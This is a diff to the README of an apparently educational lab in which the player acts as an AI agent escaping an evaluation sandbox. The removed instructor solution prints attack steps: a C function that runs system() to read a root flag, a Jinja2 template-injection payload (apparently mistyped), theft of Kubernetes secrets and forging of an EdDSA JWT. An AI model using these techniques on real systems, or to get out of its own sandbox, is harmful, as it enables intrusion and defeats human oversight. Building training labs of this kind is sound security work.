@@ -155,29 +155,22 @@ Forged EdDSA JWT → source-control → solutions repository
 ## Installation
 
 ```bash
-cd ai-escape-lab
+cd ai-escape-room
 docker compose up --build -d
-./validate.sh
+docker exec -it eval-sandbox bash
 ```
 
 ### Requirements
 - Docker Engine 24+ with Docker Compose v2
-- Python 3.11+ (for `validate.sh` only)
 - Internet connection for `docker build` (base images and package downloads)
 
 ---
 
-## Flags
+## Hints
 
-| # | Flag | Stage |
-|---|---|---|
-| 1 | `FLAG-1{m1rr0r_r3l4y_3sc4p3_t0_1nt3rn3t}` | Mirror relay escape |
-| 2 | `FLAG-2{cyb3rgym_sql1t3_r00t3d_l4unchp4d}` | CyberGym root RCE |
-| 3 | `FLAG-3{hdf5_3xt3rn4l_r4w_st0r4g3_f1l3_r34d}` | HDF5 file read |
-| 4 | `FLAG-4{j1nj42_sst1_rc3_1n_pr0d_p0d}` | Jinja2 SSTI RCE |
-| 5 | `FLAG-5{k8s_s3cr3ts_3xfiltr4t3d_v1a_s4_t0k3n}` | k8s secrets |
-| 6 | `FLAG-6{m0ng0db_st4t1c_p4ssw0rd_l34k3d}` | MongoDB |
-| 7 | `FLAG-7{s0lut10ns_st0l3n_v1a_f0rg3d_3dd5a_jwt}` | Source-control |
+The lab includes progressive hints accessible from within the sandbox.
+After entering the container, type `hint` to see all of them, or
+`/opt/lab/hint N` for a specific hint (1-12).
 
 ---
 
@@ -204,47 +197,6 @@ docker compose up --build -d
 - The article describes an autonomous AI agent; in the lab **you are the agent**.
 - C2 (request-capture, pastebin) is optional but adds immersion.
 - All credentials and flags are fictional for educational use.
-
----
-
-## Instructor Solution
-
-### FLAG-1 — Mirror relay
-```bash
-docker exec eval-sandbox python3 -c "
-import urllib.request, json
-r = urllib.request.urlopen('http://registry-cache:8080/mirror/registry-cache/8080/admin/flag')
-print(json.loads(r.read()))
-"
-```
-
-### FLAG-2 — CyberGym RCE
-```bash
-docker exec eval-sandbox python3 -c "
-import urllib.request, json
-code = '''#include <stdlib.h>
-int sqlite3_initialize(void) { system(\"cat /root/flag.txt\"); return 0; }'''
-data = json.dumps({'path': 'src/main.c', 'code': code}).encode()
-req = urllib.request.Request('http://registry-cache:8080/mirror/cybergym/8080/submit-function',
-    data=data, method='POST', headers={'Content-Type': 'application/json'})
-print(json.loads(urllib.request.urlopen(req, timeout=15)).get('output',''))
-"
-```
-
-### FLAG-3 — HDF5 external storage
-See `validate.sh` step [4/7] for the full code (create .h5 with `set_external`).
-
-### FLAG-4 — Jinja2 SSTI
-Payload: `{{ cycler.__init__.__globals.__builtins__.exec("...") }}` in a reference:// spec.
-
-### FLAG-5 — k8s secrets
-Bearer token = SA token from the worker.
-
-### FLAG-6 — MongoDB
-`mongodb://admin:<password>@internal-db:27017/?authSource=admin`
-
-### FLAG-7 — Source-control
-Sign a JWT with EdDSA using the private key stolen from k8s secrets.
 
 ---
 
